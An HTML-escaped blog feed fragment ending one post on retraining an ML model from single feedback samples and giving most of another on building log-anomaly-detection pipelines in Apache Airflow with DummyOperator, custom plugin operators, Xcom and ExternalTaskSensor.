&lt;table class=&#34;has-white-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for&lt;/mark&gt;&lt;/code&gt; i &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in &lt;/mark&gt;range(len(batch_y)):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # extract the predict_proba for batch_y&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pre_proba = pred_y[i][int(np.argmax(batch_y[i]))]&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # set the exit condition&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; success_flag = &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;False&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; no_of_attempts =&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt; 0&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # retrain on the single input and output&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; while&lt;/mark&gt; pre_proba &amp;lt;= desired_proba &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;and&lt;/mark&gt; (no_of_attempts&amp;lt;attempts):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; exec_model.fit(np.reshape(batch_x[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)), np.reshape(batch_y[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)))&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; no_of_attempts +=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt; 1&lt;/mark&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pred_one_y = exec_model.predict_proba(np.reshape(batch_x[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)), verbose=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;2&lt;/mark&gt;)&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pre_proba = pred_one_y[&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;0&lt;/mark&gt;][int(np.argmax(batch_y[i]))]&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;Attempt Number %d, Predicted Proba for this iteration %f&#34;&lt;/mark&gt; %(no_of_attempts, pre_proba))&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; if&lt;/mark&gt; pre_proba &amp;gt; desired_proba:&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; success_flag = &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;True&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; break&lt;/mark&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; if&lt;/mark&gt; (success_flag ==&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; False&lt;/mark&gt;)&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; and&lt;/mark&gt; (no_of_attempts &amp;gt;= attempts):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&#34;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;[-] Failed to incorporate this feedback&#34;&lt;/mark&gt;)&lt;br&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if&lt;/mark&gt; success_flag == &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;True&lt;/mark&gt;:&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;[+] Feedback incorporated \n&#34;&lt;/mark&gt;)&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;Took %d iterations to learn!&#34;&lt;/mark&gt; %(no_of_attempts))&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Png3: update based on single x and y array&lt;/p&gt;
&lt;p&gt;By implementing this solution, the model can be trained much quicker and save time overall. To reduce storage requirements, every file in the update folder is unlinked after being processed. &lt;/p&gt;
&lt;p&gt;Of course, it is not possible to ensure every model will be more accurate after retraining. To manage this risk, I apply A/B testing here as well. The updated model is saved to another location and only replaces the original after performing as expected in testing.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Implementation and Dynamic Generation for Tasks in Apache Airflow&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</link>
      <pubDate>Wed, 23 Nov 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</guid>
      <description>
        
        
        &lt;p&gt;I recently worked on a project focused on log anomaly detection using manageable machine learning pipelines. The pipelines mainly include &lt;strong&gt;data collection &amp;mdash; feature extraction &amp;mdash; feature engineering &amp;mdash; detection/prediction &amp;mdash; updating (maintenance)&lt;/strong&gt;. &lt;/p&gt;
&lt;p&gt;It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended &lt;a href=&#34;https://airflow.apache.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;In airflow, the core concept is the &lt;strong&gt;Directed Acyclic Graph&lt;/strong&gt; (DAG). Through the implementation, I have confirmed that this is a truly powerful tool to manage the machine learning pipelines, instead of relying on shell scripts. But, I did encounter some challenges during the process and also, fortunately, found solutions for them. &lt;/p&gt;
&lt;p&gt;The challenges can be split into two main aspects, &lt;strong&gt;pipeline management&lt;/strong&gt; and &lt;strong&gt;dynamic generation for tasks&lt;/strong&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pipeline management -&lt;/strong&gt; During the process of solving the problem about pipeline management, I met the following problems when implementing the machine learning pipelines in Airflow:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies within one DAG&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies between Dags&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome known issues with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/howto/operator/external_task_sensor.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome issues with the &lt;strong&gt;execution time&lt;/strong&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Dynamic generation for tasks -&lt;/strong&gt; When I tried to integrate the pipelines with our own &lt;strong&gt;&lt;a href=&#34;https://www.elastic.co/what-is/elk-stack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ELK&lt;/a&gt;&lt;/strong&gt; stack, I found the problem about &lt;strong&gt;how to dynamically generate the tasks in a dag&lt;/strong&gt;. This problem comes from the different log types, which include Linux, Windows, VPN and so on. I also found the same type of logs from different clients require different treatment too. The generation of tasks should be &lt;strong&gt;scalable&lt;/strong&gt; and &lt;strong&gt;automatic&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the first place, I had many choices to make. For the operator, I can choose from the PythonOperator, BaseOperator, or BashOperator. For the dependencies, I can choose TriggerDagRunOperator, Xcom, or SubDag.&lt;/p&gt;
&lt;p&gt;After some testing, I found the most effective solution is usually the simplest, even when not 100% perfect. I chose the following combination:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BaseOperator + DummyOperator + Plugins + Xcom + For loop + ExternalTaskSensor&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;1. DummyOperator Usage&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-dummyoperator-usage&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#1-dummyoperator-usage&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.12/_modules/airflow/operators/dummy_operator.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DummyOperator&lt;/a&gt; can be used to group tasks in a DAG. In order to structure different tasks into one nice workflow, I used the DummyOperator to connect them. They won’t be executed by the executor. After introducing those two tasks, there is a common start task and a common end task to connect all middle parallel tasks.&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;start_task = DummyOperator(&lt;br&gt;task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;start_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag=dag&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;)&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;end_task = DummyOperator(&lt;br&gt;task_id = &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;end_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag = dag&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;https://lh5.googleusercontent.com/gtkYla7hRWDWybDdyW0P-nCA1BWhzJ4G8ScLMzF8n6PKmLG2OKgBvAizVAo3uCPr0WMABiRN5xej9A_n9IsW9bRRph86Jez-ojx7HVbF_rumb5OgR0-EYo9LnPrO0lPEEczWrDApp_FRZQ6ghYZqh9I-YsX7uB-kNIjIo22pIzHJiBX99h7OMXJ5KJLZ&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG1：&lt;a href=&#34;https://assets.bbhub.io/company/sites/40/2018/05/airflow.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow graph view&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For the dynamic generation of tasks, I want to introduce a kind of structure to organise the code. Most of the logs share the same processing logic, so I need to introduce several automatic variables inside the tasks. The basic structure would look like the following:&lt;/p&gt;
&lt;table class=&#34;has-white-color has-black-background-color has-text-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&#39;&lt;br&gt;&amp;nbsp; def Dynamic_Function(variable):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_1 = Function1(&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_id = &#39;task_{}&#39;.format(variable),&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; dag = dag,&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; )&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; return task_1&lt;br&gt;&#39;&#39;&#39;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&amp;nbsp; task_1 = Dynamic_Function(variable)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;The variables can be read it from the environment variables or just set it as a list:&lt;/p&gt;
&lt;p&gt;# the python way to read environment values from .env file:&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;os.getenv&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;(&#39;variables&#39;&lt;/mark&gt;).split(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&lt;/mark&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;This method is not that complex, but it is quite useful when there are multiple tasks sharing the same processing logic and there is only one difference of variable in them, allowing the project to be easily scaled.  &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;2. Plugin Operator and BaseOperator&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-plugin-operator-and-baseoperator&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-plugin-operator-and-baseoperator&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;For the Function1, it is defined in a customised way in &lt;strong&gt;plugins/operators.&lt;/strong&gt; You can find the detailed information on this &lt;a href=&#34;http://michal.karzynski.pl/blog/2017/03/19/developing-workflows-with-apache-airflow/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;link&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt; The main context is shown below**:**&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;airflow.plugins_manager&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;AirflowPlugin&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; airflow.utils.decorators&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;apply_defaults&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;MyFirstOperator&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(BaseOperator): &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;@apply_defaults&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; def &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;__init__&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, my_operator_param, *args, **kwargs):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; self.operator_param = my_operator_param&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; super(MyFirstOperator, self).__init__(*args, **kwargs) &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; def&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;execute&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, context):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt; MyFirstPlugin&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(AirflowPlugin):&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; name =&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt; &#34;my_first_plugin&#34;&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;operators = [MyFirstOperator]&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I use it for the reason that I do not need to put all my code in the DAG. Otherwise, the DAG code would be extremely redundant and hard to manage.&lt;/p&gt;
&lt;p&gt;I use &lt;strong&gt;BaseOperator&lt;/strong&gt; instead of PythonOperator because of the simplicity. The PythonOperator is more complex to control and needs to set more unnecessary parameters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;With the above two solutions, the dynamic tasks can be easily built in one DAG now&lt;/strong&gt;. The following solutions are more for the connection and concurrency problems I met during a project. &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;3. Xcom &amp;amp; ExternalTaskSensor&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-xcom--externaltasksensor&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-xcom--externaltasksensor&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Now, I have to solve three key problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;How to save the result for the next task? &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to get the result from the last task?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to make sure the result is within the right time interval?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Airflow provides powerful solutions for those problems with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/concepts/xcoms.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Xcom&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/_api/airflow/sensors/external_task_sensor/index.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To save the result from the current task, Xcom is used for this requirement. It is a bit similar to git. To use it, xcom_push and xcom_pull are the main functions needed. But there is a limitation for the size, which is &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;48KB&lt;/strong&gt;&lt;/a&gt;. Normally, you do not need to worry about the size, but it is advisable to try to save the middle variable value in xcom while not using big files. &lt;/p&gt;
&lt;p&gt;If you want to extract the result obtained from the previous DAG with a specified task combing with the dynamic tasks, the extraction process is independent and you should use the ExternalTaskSensor with the following setting:&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;...&lt;br&gt;&amp;nbsp; # create the task to depend on the up_stream dag&lt;br&gt;&amp;nbsp; external_sensor = ExternalTaskSensor(&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;ext_sensor_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; external_dag_id=&#39;xxx&#39;,&lt;/mark&gt;&lt;br&gt;&amp;nbsp; external_task_id=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;xxx_{}&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;.format(variable),&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; timeout =&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;300&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; dag=dag,&lt;br&gt;&amp;nbsp; )&lt;br&gt;...&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I have to mention here, &lt;strong&gt;you should not use end_task in the previous DAG.&lt;/strong&gt; If you do not want all tasks to be finished on the previous day, then go through the next day.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;4. Execution Time&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;4-execution-time&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#4-execution-time&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Execution time is kind of limited in Airflow in version 1.x. I have not tested the 2.x. In version 1.x, it does not help to change the timezone in airflow.cfg.&lt;/p&gt;
&lt;p&gt;But you can use the specified way to solve the problem. The &lt;strong&gt;pendulum library&lt;/strong&gt; is a really great option.&lt;/p&gt;
